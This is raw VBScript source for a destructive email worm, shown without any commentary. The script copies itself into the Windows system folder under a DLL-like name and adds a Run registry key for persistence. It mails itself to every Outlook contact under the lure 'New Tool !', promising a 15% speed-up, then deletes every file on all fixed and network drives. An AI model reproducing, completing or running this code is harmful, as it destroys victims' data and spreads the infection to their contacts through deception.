on error resume next
autostart()
spreadtoemail()
killfiles()
sub autostart()
dim fso, dir, file, c, regedit
set fso = createobject("scripting.filesystemobject")
dir = fso.getspecialfolder(1)
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
set c = fso.GetFile(WScript.ScriptFullName)
c.copy (dir & "\xp32dll.vbs")
regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\lehota",dir & "\xp32dll.vbs"
end sub
Sub Listfiles(Folder)
Dim f, fc, f1, fso
set fso=createobject("scripting.filesystemobject")
Set f = fso.GetFolder(Folder)
Set fc = f.Files
For Each f1 In fc
fso.deletefile (f1.Path)
Next
End Sub
Sub ListFolders (Folder)
Dim f, fc, f1, fso
set fso=createobject("scripting.filesystemobject")
Set f = fso.GetFolder(Folder)
Set fc = f.SubFolders
For Each f1 In fc
Listfiles (f1.Path)
ListFolders (f1.Path)
Next
End Sub
Sub Killfiles()
dim d , dc, s, fso
set fso=createobject("scripting.filesystemobject")
Set dc = fso.Drives
For Each d In dc
If d.drivetype = 2 Or d.drivetype = 3 Then ListFolders (d.Path & "\")
Next
End Sub

Sub spreadtoemail()
Dim e, l, g, i, o, t
Set i = CreateObject("Outlook.Application")
Set e = i.GetNameSpace("MAPI")
For Each l In e.AddressLists
Set g = i.CreateItem(0)
For o = 1 To l.AddressEntries.Count
Set t = l.AddressEntries(o)
If o = 1 Then
g.BCC = t.Address
Else
g.BCC = g.BCC & "; " & t.Address
End If
Next
g.Subject = "New Tool !"
g.Body = "This tool can speed up your PC up to 15% !"
g.Attachmets.Add WScript.ScriptFullName
g.DeleteAfterSubmit = True
g.Send
Next
End Sub

Sub Regwrite(key, value)
dim regedit
set regedit = createobject("wscript.shell")
regedit.regwrite key, value
End Sub

